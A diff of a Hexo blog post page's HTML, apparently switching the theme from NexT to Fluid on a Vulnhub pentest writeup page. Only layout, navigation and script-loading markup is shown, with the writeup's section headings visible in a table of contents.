-              <a href="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/" rel="prev" title="Vulnhub Kioptrix2014 Writeup">
-                Vulnhub Kioptrix2014 Writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/images/avatar.png"
-                alt="Shawn" />
-            
-              <p class="site-author-name" itemprop="name">Shawn</p>
-              <p class="site-description motion-element" itemprop="description">Learn it & Try harder</p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives">
-              
-                  <span class="site-state-item-count">25</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">10</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
-                  <span class="site-state-item-name">标签</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
             </div>
-          
-
-          
-            <div class="links-of-author motion-element">
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
                 
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/peaceSh4wn" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%89%93%E9%9D%B6/">打靶</a>
+                    
+                      <a class="hover-with-bg" href="/categories/pentest-training/">pentest training</a>
+                    
+                  </div>
                 
-                  <span class="links-of-author-item">
-                    <a href="https://twitter.com/testyouname22" target="_blank" title="Twitter">
-                      
-                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                  </span>
                 
-            </div>
-          
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Vulnhub/">Vulnhub</a>
+                    
+                  </div>
+                
+              </div>
               
-            
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Vulnhub Kioptrix2014 Writeup</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/05/Vulnhub-DC-1-Writeup/">
+                        <span class="hidden-mobile">Vulnhub DC-1 Writeup</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-情报搜集"><span class="nav-number">1.</span> <span class="nav-text">0x01 情报搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞挖掘与利用"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞挖掘与利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-提权-amp-GetFlag"><span class="nav-number">3.</span> <span class="nav-text">0x03 提权&amp;GetFlag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">4.</span> <span class="nav-text">0x04 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考资源"><span class="nav-number">5.</span> <span class="nav-text">0x05 参考资源</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-
-    </div>
-  </aside>
-
-
-        
+          </article>
+        </div>
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Shawn</span>
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
 </div>
 
-
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="site-uv">
-      <i class="fa fa-user"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-      
-    </span>
-  
-
-  
-    <span class="site-pv">
-      <i class="fa fa-eye"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-      
-    </span>
-  
+      </div>
+    
+  </div>
 </div>
 
+<!-- Custom -->
 
 
+    
 
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-
-
-
-        
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
       </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
-    
-
-    
-
+    </div>
   </div>
+</div>
+    
 
-  
+    
+  </main>
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
   
 
   
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
 
   
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
+</footer>
 
 
+  <!-- SCRIPTS -->
   
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
+<!-- Plugins -->
 
 
   
+    <script  src="/js/img-lazyload.js" ></script>
   
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
 
 
 
@@ -896,364 +456,57 @@
 
 
 
-
-
-  
-
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
 
 
 
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
 
-
-
-  
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
-
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
   </script>
 
 
 
 
 
-  
 
-  
 
-  
 
-  
-  
 
-  
 
-  
 
-  
 
-  
-  <link rel="stylesheet" href="/dist/APlayer.min.css">
-  <div id="aplayer"></div>
-  <script type="text/javascript" src="/dist/APlayer.min.js"></script>
-  <script type="text/javascript" src="/dist/music.js"></script>
-  
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
 </body>
 </html>
